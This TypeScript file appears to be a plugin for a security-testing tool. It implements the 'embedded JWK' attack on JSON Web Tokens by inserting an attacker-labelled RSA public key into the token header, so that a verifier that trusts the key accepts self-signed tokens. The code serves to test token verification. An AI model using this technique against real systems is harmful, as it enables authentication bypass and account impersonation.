import type { MischiefPlugin } from "../types.js";

export const embeddedJwkAttack: MischiefPlugin = {
	id: "embedded-jwk-attack",
	name: "Embedded JWK Attack",
	severity: "critical",
	phase: "token-signing",
	spec: {
		description: "Embeds attacker's public key directly in JWT header",
		rfc: "RFC 7515 Section 4.1.3",
		cwe: "CWE-347",
	},
	description: "Includes signing key in JWT header, allowing self-signed tokens",

	async apply(ctx) {
		if (!ctx.token) {
			return { applied: false, mutation: "No token context", evidence: {} };
		}

		ctx.token.header.jwk = {
			kty: "RSA",
			n: "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
			e: "AQAB",
			kid: "attacker-key-1",
			use: "sig",
		};

		return {
			applied: true,
			mutation: "Embedded attacker's JWK in token header",
			evidence: {
				embeddedKid: "attacker-key-1",
				vulnerability: "Token can be self-signed if client trusts embedded jwk header",
			},
		};
	},
};
